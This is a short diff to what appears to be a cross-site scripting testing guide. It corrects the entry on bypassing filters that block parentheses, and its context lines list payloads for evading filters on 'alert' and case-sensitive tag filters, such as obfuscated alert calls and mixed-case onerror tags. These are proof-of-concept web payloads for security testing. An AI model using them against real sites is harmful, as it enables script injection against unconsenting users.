@@ -115,8 +115,8 @@ what gets filtered versus what passes through.
 **`alert` blocked**: Use `confirm(1)`, `prompt(1)`, `print()`,
 `window['al'+'ert'](1)`, `` `${alert(1)}` ``
 
-**Parentheses blocked**: `alert`1`` (tagged template), `throw/a]er/.source`
-with error handler, `location='javascript:alert\x281\x29'`
+**Parentheses blocked**: `` alert`1` `` (tagged template),
+`onerror=alert;throw 1`, `location='javascript:alert\x281\x29'`
 
 **Case-sensitive filter**: `<ScRiPt>`, `<IMG SRC=x OnErRoR=alert(1)>`
 
